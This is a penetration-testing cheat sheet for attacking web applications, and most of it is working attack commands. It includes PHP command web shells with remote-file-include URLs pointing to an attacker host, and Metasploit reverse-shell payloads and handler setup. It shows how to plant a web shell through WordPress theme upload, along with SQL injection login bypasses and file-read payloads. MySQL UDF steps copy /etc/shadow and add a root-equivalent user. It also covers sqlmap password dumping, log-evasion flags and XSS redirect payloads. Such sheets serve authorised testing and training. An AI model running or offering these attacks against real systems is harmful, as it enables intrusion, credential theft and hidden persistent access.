WebShell Backdoors

Minimal php command shells

file cmd.php: PHP script text =&gt;

&lt;?php system\($\_GET\['cmd'\]\) ?&gt;

or

&lt;?php system\($\_REQUEST\['cmd'\]\); ?&gt;

Example usage via Remote File Include \(RFI\):

http://&lt;target-ip&gt;/index.php?cmd=&lt;command to execute&gt;&page=http://&lt;attacker-ip&gt;/cmd.php

Null Bytes \(‰00 - html code ampersand, hash 137, 00\) may also assist in some cases:

http://&lt;target-ip&gt;/index.php?cmd=&lt;command to execute&gt;&page=http://&lt;attacker-ip&gt;/cmd.php

‰

e.g.

http://&lt;attacker-ip&gt;/index.php?system=../../../../../etc/passwd.html

Encoding windows reverse command shell as asp

msfpayload windows/shell\_reverse\_tcp LHOST=&lt;attacker-ip&gt; LPORT=&lt;attacker-nc-port&gt; R \| msfencode -t asp -o &lt;filename&gt;.asp

Encoding meterpreter in asp

msfpayload windows/meterpreter/reverse\_tcp LHOST=&lt;attacker-ip&gt; LPORT=&lt;attacker-multi-handler-port&gt; R \| msfencode -t asp -o &lt;filename&gt;.asp

------

attacker msfconsole:

use multi/exploit/handler

set payload windows/meterpreter/reverse\_tcp

set LHOST &lt;attacker-ip&gt;

set LPORT &lt;attacker-multi-handler-port&gt;

exploit





http://stackoverflow.com/questions/3115559/exploitable-php-functions



------------------------------------------------------------------------------------------------------------------

Encoding and Decoding - for backdoors, injection, and \(de\)obfustication

http://www.asciitohex.com/

http://home.paulschou.net/tools/xlate/

http://www.idea2ic.com/PlayWithJavascript/hexToAscii.html



Burp Suite \(Decoder module\)

http://portswigger.net/burp/help/decoder.html



Decode base64 standard input 

base64 -d 

&lt;paste base-64 encoded text&gt; 

^D



Javascript deobfustication

http://www.javascriptbeautifier.com/

http://jsbeautifier.org/

http://vitzo.com/en/tools/javascript/javascript-beautifier



------------------------------------------------------------------------------------------------------------------

Specific Web applications

Joomla

Joomla default database configuration filename

&lt;web-app-path&gt;/configuration.php

Scanning Joomla! for plugins and versions

/pentest/web/scanners/joomscan/joomscan.pl -u &lt;target-and-joomla-path&gt;

/pentest/enumeration/web/cms-explorer  -url &lt;target-and-joomla-path&gt; -type joomla



WordPress

WordPress default database configuration filename

&lt;web-app-path&gt;

WordPress default login page

&lt;web-app-path&gt;/wp-login.php

WordPress plugins

&lt;web-app-path&gt;/wp-content/plugins

Scanning WordPress for plugins and versions

/pentest/web/wpscan/wpscan.rb --url &lt;target-and-wordpress-path&gt; --proxy &lt;proxy-addr:port&gt; -enumerate \[u\|p\|v\|t\] 

/pentest/enumeration/web/cms-explorer  -url &lt;target-and-wordpress-path&gt; -type wordpress

Newer WP: "Themes" can be uploaded as zip files by WP administrators i.e. you:

mkdir wpx

vi wpx/cmd.php

cat wpx/cmd.php

&lt;?php system\($\_GET\['cmd'\]\) ?&gt;

zip -r wpx.zip wpx

upload wpx.zip via web interface as an installed theme

Command execution access is via: 

&lt;web-app-path&gt;/wp-content/plugins/wpx/cmd.php?cmd=&lt;command\(s\)&gt; 

Older WP: Webshells can be added by editing exiting files/themes via the web interface or by enabling file upload and permitting the valid file extension \(e.g. .php\)



Cacti

Cacti default database configuration filename

&lt;web-app-path&gt;/include/config.php





DeV!L\`z ClanPortal

DeV!L\`z ClanPortal default database configuration filename

&lt;web-app-path&gt;/inc/mysql.php



Drupal

Drupal default database configuration filename

&lt;web-app-path&gt;/sites/default/settings.php



Scanning Drupal for plugins and versions

/pentest/enumeration/web/cms-explorer  -url &lt;target-and-drupal-path&gt; -type drupal

PHPMyAdmin

/phpmyadmin/changelog.php

Timeclock

Timeclock default database configuration filename

&lt;web-app-path&gt;/db.php





Default files to check for additional paths

lt;target-webpath&gt;/robots.txt

lt;target-webpath&gt;/style.css



------------------------------------------------------------------------------------------------------------------

SQL Terminators/Comments

MSSQL and MySQL:

&lt;sql injected command&gt;;--

MySQL:

&lt;sql injected command&gt;;\#





Login Pages Basic SQL injection 

MS IIS

' OR '1=1';--



MySQL

'OR 1=1;--

'OR 1=1;\#

'OR 1=1 LIMIT 1;\#



Enumerate number of columns/fields

...UNION SELECT 1;--

...UNION SELECT 1,2;--

...UNION SELECT 1,2,3;--



Load file by injecting into the vulnerable field - encode string if necessary

…UNION ALL SELECT NULL,LOAD\_FILE\(‘&lt;user-readable-file&gt;’\),NULL,NULL;-- …UNION ALL SELECT NULL,LOAD\_FILE\(‘&lt;user-readable-file&gt;’\),NULL,NULL INTO OUTFILE ‘&lt;writeable-path-or-web-directorygt;’;--



Dump/Write to file

\(see encode text/shell to hex, base64\)

...SELECT \* FROM mytable INTO DUMPFILE ‘&lt;writeable-path-or-web-directorygt;’; —

...SELECT \* FROM mytable INTO OUTFILE ‘&lt;writeable-path-or-web-directorygt;’; —



http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet



http://ferruh.mavituna.com/sql-injection-cheatsheet-oku

MySQL &lt;5.0 User Defined Functions

command execution and privilege escalation with mysql running as root/SYSTEM

mysql&gt; use mysql;

mysql&gt; create table &lt;table-name&gt;\(line blob\);

Query OK, 0 rows affected \(0.00 sec\)

mysql&gt; insert into &lt;table-name&gt; values\(load\_file\('&lt;path-to-udf.so-file&gt;'\);

Query OK, 1 rows affected \(0.00 sec\)

mysql&gt; select \* from &lt;table-name&gt; into dumpfile '/usr/lib/lib\_mysqludf\_sys.so';

Query OK, 1 rows affected \(0.00 sec\)

mysql&gt; create function &lt;name\_of\_new\_function&gt; returns int soname 'lib\_mysqludf\_sys.so';

Example command execution with the new function:

mysql&gt; set @status := &lt;name\_of\_new\_function&gt;\('cat /etc/shadow &gt; /tmp/shadow'\);

Query OK, 0 rows affected \(0.06 sec\)

mysql&gt; set @status := &lt;name\_of\_new\_function&gt;\('/usr/sbin/useradd -o -u0 -g0 -d /dev/null -s /bin/bash &new-username&gt;'\);

Query OK, 0 rows affected \(0.06 sec\)

mysql&gt; set @status := &lt;name\_of\_new\_function&gt;\('echo &lt;new-username&gt;:&lt;chosen-password&gt; \| /usr/sbin/chpasswd'\);

Query OK, 0 rows affected \(0.06 sec\)

or

mysql&gt; select &lt;name\_of\_new\_function&gt;\('/usr/sbin/useradd -o -u0 -g0 -d /dev/null -s /bin/bash &new-username&gt;'\);

+----------------------------------------------------------------------------------------------------------------------------------------------------------+

\| &lt;name\_of\_new\_function&gt;\('/usr/sbin/useradd -o -u0 -g0 -d /dev/null -s /bin/bash &new-username&gt;'\); \|+----------------------------------------------------------------------------------------------------------------------------------------------------------+

\| 4294967296                                                                                                                                       \| +----------------------------------------------------------------------------------------------------------------------------------------------------------+

1 row in set \(1.70 sec\)

http://0x80.org/blog/?p=298

http://blog.encription.co.uk/privilege-escalation-using-mysql-user-defined-functions/

http://www.0xdeadbeef.info/exploits/raptor\_udf.c

http://bernardodamele.blogspot.com.au/2009/01/command-execution-with-mysql-udf.html

SQLMap commands





cd /pentest/database/sqlmap

Retrieve SQL Banner, current database and current user; test if the user is the db administrator

./sqlmap.py -u "http://&lt;target&gt;/index.php?param1=1&param2=2&param3=3" -p &lt;injectable-parameter&gt; --banner --current-db --current-user --is-dba



Enumerate User Passwords

./sqlmap.py -u "http://&lt;target&gt;/index.php?param1=1&param2=2&param3=3" --passwords



List of Databases

./sqlmap.py -u "http://&lt;target&gt;/index.php?param1=1&param2=2&param3=3" --dbs



Retrieve tables from specific Database

./sqlmap.py -u "http://&lt;target&gt;/index.php?param1=1&param2=2&param3=3" --tables -D &lt;database-name&gt;



Dump specific table contents

./sqlmap.py -u "http://&lt;target&gt;/index.php?param1=1&param2=2&param3=3" --dump -D &lt;database-name&gt; -T &lt;table-name&gt;



Retrieve system /etc/password file

./sqlmap.py -u "http://&lt;target&gt;/index.php?param1=1&param2=2&param3=3" --file-read=/etc/passwd



Retrieve apache2 configuration file to identify live website config files

./sqlmap.py -u "http://&lt;target&gt;/index.php?param1=1&param2=2&param3=3" --file-read=/etc/apache2/apache2.conf



Retrieve default configuration file to subsequently identify Document Root \(web directory location\)

./sqlmap.py -u "http://&lt;target&gt;/index.php?param1=1&param2=2&param3=3" --file-read=/etc/apache2/sites-enabled/000-default



Retrieve CMS/Web app default configuration file if possible

./sqlmap.py -u "http://&lt;target&gt;/index.php?param1=1&param2=2&param3=3" --file-read=&lt;Document-root-path&gt;/&lt;Web-Application-Path&gt;/&lt;configuration-file&gt;





Other interesting flags:

--check-waf         Check for existence of WAF/IPS/IDS protection - implementation of nmap http-waf-detect nse script





Some logfile Misdirection flags:

--random-agent      Use randomly selected HTTP User-Agent header

--safe-url=&lt;target-normalised-URL&gt;   Url address to visit frequently during testing

--safe-freq=&lt;num-seconds&gt;  Test requests between two visits to a given safe url

--mobile            Imitate smartphone through HTTP User-Agent header



------------------------------------------------------------------------------------------------------------------



Basic Client-side attacks

XSS - iframe

&lt;iframe src="http://&lt;evil-site-address&gt;" width="0" height="0"&gt;&lt;/iframe&gt;



XSS - javascript



&lt;script&gt;document.location="&lt;evil-site-address&gt;";&lt;/script&gt;

